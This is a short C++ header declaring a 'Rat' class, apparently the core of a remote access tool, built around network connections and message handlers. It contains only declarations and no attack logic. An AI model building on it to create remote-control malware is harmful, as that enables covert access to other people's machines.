#pragma once

#include <vector>

#include "ICommunicationFactory.h"
#include "IMessageHandler.h"
#include "IRat.h"

class Rat : public IRat
{
public:
	Rat(
		std::shared_ptr<IConnectionFactory> client,
		std::shared_ptr<IConnection> connection,
		std::shared_ptr<IMessageSender> sender,
		std::shared_ptr<ICommunicationFactory> factory,
		std::vector<std::shared_ptr<IMessageHandler>> handlers);

private:
	void OnMessage(MessageType type, SharedSpan content) override;
	void OnDisconnection() override;

	std::shared_ptr<IConnectionFactory> _client;
	std::shared_ptr<IConnection> _connection;
	std::shared_ptr<IMessageSender> _sender;
	std::shared_ptr<IMessageListener> _listener;
	std::vector<std::shared_ptr<IMessageHandler>> _handlers;
};
